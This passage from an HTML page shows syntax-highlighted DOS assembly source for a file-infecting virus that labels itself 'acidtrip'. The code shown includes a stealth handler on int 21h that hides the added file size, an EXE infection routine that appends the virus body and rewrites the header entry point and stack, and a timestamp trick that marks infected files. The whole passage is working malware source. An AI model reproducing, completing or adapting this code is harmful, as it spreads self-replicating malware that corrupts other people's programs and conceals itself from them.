    </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">exit_interrupt_stealthvec</span><span class="sc0">   </span><span class="sc1">;exit if function unsuccessful</span><span class="sc0">

    </span><span class="sc6">pushf</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">            </span><span class="sc1">;push all used registers</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2Fh</span><span class="sc0">                     </span><span class="sc1">;get DTA adress</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;get time and date stamps</span><span class="sc0">

    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1Fh</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1Fh</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                         </span><span class="sc1">;unmask seconds and date</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">;is file infected?</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">exit_interrupt_stealth</span><span class="sc0">     </span><span class="sc1">;if not, don't subtract size</span><span class="sc0">

    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1Ah</span><span class="sc4">],</span><span class="sc5">vlength</span><span class="sc0">
    </span><span class="sc6">sbb</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1Ch</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">    </span><span class="sc1">;subtract virus size in bytes</span><span class="sc0">

    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">exit_interrupt_stealth</span><span class="sc0">

</span><span class="sc5">move_pointer_end</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cwd</span><span class="sc0">                            </span><span class="sc1">;zero cx and dx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">                   </span><span class="sc1">;move pointer from EOF</span><span class="sc0">
</span><span class="sc5">function</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushf</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">i21veco</span><span class="sc0">      </span><span class="sc1">;simulate call to original int 21h</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">open_readwrite</span><span class="sc4">:</span><span class="sc0">                        </span><span class="sc1">;opens file at DS:DX for read/write</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D00h</span><span class="sc0">                   </span><span class="sc1">;open for read only access</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">bad_open</span><span class="sc0">                    </span><span class="sc1">;carry set means open error</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                        </span><span class="sc1">;file handle</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1220h</span><span class="sc0">                   </span><span class="sc1">;get JFT entry</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">2Fh</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1216h</span><span class="sc0">                   </span><span class="sc1">;get SFT location</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;handle number</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">2Fh</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">     </span><span class="sc1">;set file for read/write</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">bad_open</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">exit_infect</span><span class="sc0">          </span><span class="sc1">;exit if bad open</span><span class="sc0">
</span><span class="sc5">infect_file</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">   </span><span class="sc1">;push all used registers</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">open_readwrite</span><span class="sc0">            </span><span class="sc1">;open file for read/write access</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">24</span><span class="sc0">                      </span><span class="sc1">;24 bytes of header to read</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">exeheader</span><span class="sc4">)</span><span class="sc0">       </span><span class="sc1">;EXE header information</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">                     </span><span class="sc1">;read file or device</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">;enough bytes read?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">bad_file</span><span class="sc0">                   </span><span class="sc1">;if not, file too small</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">exeid</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc12">'MZ'</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">disease_exe</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc12">'ZM'</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">disease_exe</span><span class="sc0">                 </span><span class="sc1">;exe file?</span><span class="sc0">
        
</span><span class="sc5">bad_file</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">                     </span><span class="sc1">;close file with handle</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    
</span><span class="sc5">exit_infect</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">    </span><span class="sc1">;pop all used registers</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">exit_interrupt_chained</span><span class="sc0">     </span><span class="sc1">;execute rest of interrupt chain</span><span class="sc0">

</span><span class="sc5">disease_exe</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">chksum</span><span class="sc4">,</span><span class="sc5">virusid</span><span class="sc0">             </span><span class="sc1">;file already infected?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">bad_file</span><span class="sc0">                    </span><span class="sc1">;if so, bad file</span><span class="sc0">

    </span><span class="sc6">lds</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">0Dh</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;get old file date and time</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                     </span><span class="sc1">;and save</span><span class="sc0">
    
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc5">minallc</span><span class="sc4">,</span><span class="sc5">ressize</span><span class="sc0">            </span><span class="sc1">;add virus size in paragraphs</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                        </span><span class="sc1">;save SFT segment</span><span class="sc0">

    </span><span class="sc6">les</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">initss</span><span class="sc0">     </span><span class="sc1">;get initial SS:SP (reversed)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">old_ss</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">old_sp</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">

    </span><span class="sc6">les</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">initip</span><span class="sc0">     </span><span class="sc1">;get initial CS:IP</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">old_cs</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">old_ip</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">move_pointer_end</span><span class="sc0">          </span><span class="sc1">;move file pointer to end of file</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                         </span><span class="sc1">;convert file size to seg:offset</span><span class="sc0">

    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">headers</span><span class="sc0">                 </span><span class="sc1">;subtract header size from segment</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">initcs</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">initip</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                  </span><span class="sc1">;set initial cs:ip</span><span class="sc0">
    
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                   </span><span class="sc1">;set delta offset in virus code</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">sspace</span><span class="sc4">)+</span><span class="sc2">64</span><span class="sc4">+</span><span class="sc2">100h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">initsp</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">initss</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">;set initial SS:SP in exe header</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">chksum</span><span class="sc4">,</span><span class="sc5">virusid</span><span class="sc0">             </span><span class="sc1">;set file as already infected</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">                    </span><span class="sc1">;offset of virus code in memory</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">vlength</span><span class="sc0">                 </span><span class="sc1">;length of virus code</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                     </span><span class="sc1">;write file or device</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">move_pointer_end</span><span class="sc0">          </span><span class="sc1">;get file size</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                         </span><span class="sc1">;convert to pages</span><span class="sc0">

    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                     </span><span class="sc1">;no remainder?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">no_remainder</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                         </span><span class="sc1">;if remainder add another page</span><span class="sc0">
</span><span class="sc5">no_remainder</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">expages</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">exbytes</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                 </span><span class="sc1">;set new exe size</span><span class="sc0">

    </span><span class="sc6">cwd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">    </span><span class="sc1">;zero file pointer in SFT</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">exeheader</span><span class="sc4">)</span><span class="sc0">       </span><span class="sc1">;exe header information</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">24</span><span class="sc0">                      </span><span class="sc1">;24 bytes to change</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                         </span><span class="sc1">;write file or device</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">;old file date/time</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                        </span><span class="sc1">;save original file date</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,-</span><span class="sc2">20h</span><span class="sc0">                    </span><span class="sc1">;reset seconds</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">1Fh</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                         </span><span class="sc1">;unmask date field</span><span class="sc0">

    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                       </span><span class="sc1">;seconds=date</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                         </span><span class="sc1">;restore old date</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">                   </span><span class="sc1">;set file date and time</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">bad_file</span><span class="sc0">                   </span><span class="sc1">;close and exit</span><span class="sc0">
    
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">vbot</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">                      </span><span class="sc1">;bottom of virus code</span><span class="sc0">
</span><span class="sc5">htop</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">                      </span><span class="sc1">;top of heap</span><span class="sc0">

</span><span class="sc5">i21veco</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">i21vecs</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;old int 21h vector</span><span class="sc0">

</span><span class="sc5">exeheader</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">exeid</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">;Unchanged      ;EXE signature</span><span class="sc0">
</span><span class="sc5">exbytes</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;number of bytes in last page</span><span class="sc0">
</span><span class="sc5">expages</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;number of pages in file</span><span class="sc0">
</span><span class="sc5">reloci</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">;Unchanged      ;number of items in relocation table</span><span class="sc0">
</span><span class="sc5">headers</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">;Unchanged      ;size of header in paragraphs</span><span class="sc0">
</span><span class="sc5">minallc</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;minimum memory to be allocated</span><span class="sc0">
</span><span class="sc5">maxallc</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">;Unchanged      ;maximum memory to be allocated</span><span class="sc0">
</span><span class="sc5">initss</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;initial SS value</span><span class="sc0">
</span><span class="sc5">initsp</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;initial SP value (used as ID word)</span><span class="sc0">
</span><span class="sc5">chksum</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;complimented checksum</span><span class="sc0">
</span><span class="sc5">initip</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;initial IP value</span><span class="sc0">
</span><span class="sc5">initcs</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;initial CS value</span><span class="sc0">
</span><span class="sc5">reltabl</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">;Unchanged      ;byte offset to relocation table</span><span class="sc0">
</span><span class="sc5">ovnum</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">;Unchanged      ;overlay number</span><span class="sc0">

</span><span class="sc5">hbot</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">                      </span><span class="sc1">;bottom of heap data</span><span class="sc0">

</span><span class="sc5">sspace</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">70</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">             </span><span class="sc1">;virus stack</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">acidtrip</span><span class="sc0">                       </span><span class="sc1">;end of virus code</span><span class="sc0">
</span></div></body>
</html>
